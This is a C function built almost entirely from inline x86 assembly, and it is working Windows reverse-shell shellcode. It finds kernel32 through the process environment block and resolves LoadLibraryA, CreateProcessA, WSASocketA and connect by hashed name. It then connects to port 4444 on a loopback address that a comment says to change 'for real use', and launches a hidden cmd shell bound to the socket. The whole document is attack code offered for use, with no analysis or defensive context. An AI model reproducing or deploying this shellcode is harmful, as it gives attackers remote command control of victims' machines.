Naked int tcp_connect_back(void) 
{
	__asm {
		jmp _start;
		find_kernel32:
			push esi;
			xor eax, eax;
			mov eax, dword ptr fs:[eax + 0x30];
			mov eax, dword ptr ds:[eax + 0x0c];
			mov esi, dword ptr ds:[eax + 0x0c]; // in load order -> second entry
			lodsd;
			xor ebx, ebx;
			mov eax, dword ptr ds:[eax + ebx];
			mov eax, dword ptr ds:[eax + 0x18];
			pop esi;
			ret;

		resolve_symbol: //; (base dll, hashed function name)
			pushad;
			//; first argument en ebp+24 -&gt; base address dll
			mov ebp, dword ptr ss:[esp + 0x24];
			mov edi, dword ptr ss:[ebp + 0x3c]; // PE header
			mov edi, dword ptr ss:[ebp + edi + 0x78]; // export section
			add edi, ebp;
			mov ecx, dword ptr ds:[edi + 0x18]; //number of symbols of the dll
			mov ebx, dword ptr ds:[edi + 0x20]; //rva symbol
			add ebx, ebp;
		search_iteration:
			test ecx, ecx;
			je search_failed;
			dec ecx;
			mov esi, dword ptr ds:[ebx + ecx * 4];
			add esi, ebp;
			//;hashing the function name to comparison
		compute_hash:
			xor edx, edx;
			xor eax, eax;
			cld;
		compute_hash_again:
			lodsb;
			test al, al;
			jz compare_function;
			ror edx, 0x0d;
			add edx, eax;
			jmp compute_hash_again;
		compare_function:
			cmp edx, dword ptr ss:[esp + 0x28]; //2nd argument -&gt; hashed name
			jnz search_iteration;
			mov edx, dword ptr ds:[edi + 0x24];
			add edx, ebp;
			mov cx, word ptr ds:[edx + ecx * 2];
			mov edx, dword ptr ds:[edi + 0x1c];
			add edx, ebp;
			mov eax, dword ptr ds:[edx + ecx * 4];
			add eax, ebp;
			mov dword ptr ss:[esp + 0x1c], eax; //eax register saved in popad
		search_failed:
			popad;
			ret;
 
		_start:
			jmp short get_function_names;
		return_start:
			jmp short magic_begins;
		get_function_names:
			call return_start;
			//; Kernel32.dll
			//;LoadLibraryA ebp + c
			__emit 0x8e;
			__emit 0x4e;
			__emit 0x0e;
			__emit 0xec;
			//;ExitProcess ebp +8
			__emit 0x7e;
			__emit 0xd8;
			__emit 0xe2;
			__emit 0x73;
			//;CreateProcessA ebp + 4
			__emit 0x72;
			__emit 0xfe;
			__emit 0xb3;
			__emit 0x16;
			//; ws2_32.dll
			//;WSASocketA ebp + 18
			__emit 0xd9;
			__emit 0x09;
			__emit 0xf5;
			__emit 0xad;
			//;connect ebp + 14
			__emit 0xec;
			__emit 0xf9;
			__emit 0xaa;
			__emit 0x60;
			//;WSAStartup ebp + 10
			__emit 0xcb;
			__emit 0xed;
			__emit 0xfc;
			__emit 0x3b;
 
		magic_begins:
			pop esi;
			xor eax, eax;
			mov al, 0x30;
			sub esp, eax;
			mov ebp, esp; //new frame
			call find_kernel32;
			mov ebx, eax; // ebx = kernel32 base address
			xor ecx, ecx;
			mov cl, 0x03;
			mov edx, ebp;
		fill_function_kernel32:
			test ecx, ecx;
			je fill_function_kernel32_finished;
			lodsd;
			push eax;
			push ebx;
			call resolve_symbol;
			push ecx;
			shl ecx, 0x02;
			lea ebx, dword ptr ds:[edx + ecx];
			mov dword ptr ds:[ebx], eax;
			pop ecx;
			pop ebx;
			xor eax, eax;
			mov al, 0x04;
			add esp, eax;
			dec ecx;
			jmp fill_function_kernel32;
		fill_function_kernel32_finished:
			xor eax, eax;
			mov ax, 0x6c6c;
			push eax;
			push 0x642e3233;
			push 0x5f327377;
			push esp;
			call dword ptr ss:[ebp + 0x0c]; //LoadLibraryA("ws2_32");
			mov ebx, eax; //HMODULE ws2_32
			lea edx, dword ptr ss:[ebp + 0x0c];
			xor ecx, ecx;
			mov cl, 0x03;
		fill_function_ws2_32:
			test ecx, ecx;
			je fill_function_ws2_32_finished;
			lodsd;
			push eax;
			push ebx;
			call resolve_symbol;
			push ecx;
			shl ecx, 0x02;
			lea ebx, dword ptr ds:[edx + ecx];
			mov dword ptr ds:[ebx], eax;
			pop ecx;
			pop ebx;
			xor eax, eax;
			mov al, 0x04;
			add esp, eax;
			dec ecx;
			jmp fill_function_ws2_32;
		fill_function_ws2_32_finished:
		initialize_cmd:
			mov eax, 0x646d6301;
			sar eax, 0x08;
			push eax;
			mov dword ptr ss:[ebp + 0x2c], esp;
		WSAStartup: //;WSAStartup(wVersion, &amp;wsadata)
			xor eax, eax;
			mov ah, 0x02; //sizeof(wsadata) = 0x190 -&gt; we save 0x200
			sub esp, eax;
			push esp;
			shr eax, 0x08; //version 2.0
			push eax;
			call dword ptr ss:[ebp + 0x10];
		WSASocket: //;WSASocket(af, type, protocol, lpProtocolInfo, GROUP g, dwFlags)
			xor eax, eax;
			push eax;
			push eax;
			push eax;
			push eax;
			inc eax;
			push eax; //type 1 -&gt; SOCK_STREAM
			inc eax;
			push eax; //2 -&gt; AF_INET
			call dword ptr ss:[ebp + 0x18];
			mov esi, eax;
		connect: //;connect(socket, struct sockaddr, int namelen)
			push 0x0101017f; //loopback -&gt; change this for real use
			mov ebx, 0x5c110102; //HW port 4444 - LW AF_INET
			dec bh;
			push ebx;
			mov ebx, esp;
			xor eax, eax;
			mov al, 0x10;
			push eax;
			push ebx;
			push esi;
			call dword ptr ss:[ebp + 0x14];
			//;CreateProcess()
		initialize_process:
			xor ecx, ecx;
			mov cl, 0x54;
			sub esp, ecx;
			mov edi, esp;
			push edi;
		zero_structs:
			xor eax, eax;
			rep stosb;
			pop edi;
		initialize_structs:
			mov byte ptr ds:[edi], 0x44;
			mov byte ptr ds:[edi + 0x2d], 0x01;
			push edi;
			mov eax, esi;
			lea edi, dword ptr ds:[edi + 0x38];
			stosd;
			stosd;
			stosd;
			pop edi;
		execute_process:
			xor eax, eax;
			lea esi, dword ptr ds:[edi + 0x44];
			push esi;
			push edi;
			push eax;
			push eax;
			mov al, 0x80; //create_no_window
			shl eax, 0x14; //create_no_window
			push eax;
			xor eax,eax;
			mov al, 0x01;
			push eax;
			dec eax;
			push eax;
			push eax;
			push dword ptr ss:[ebp + 0x2c]; // cmd
			push eax;
			call dword ptr ss:[ebp + 0x04];
		exit_process:
			call dword ptr ss:[ebp + 0x08];
	}
}
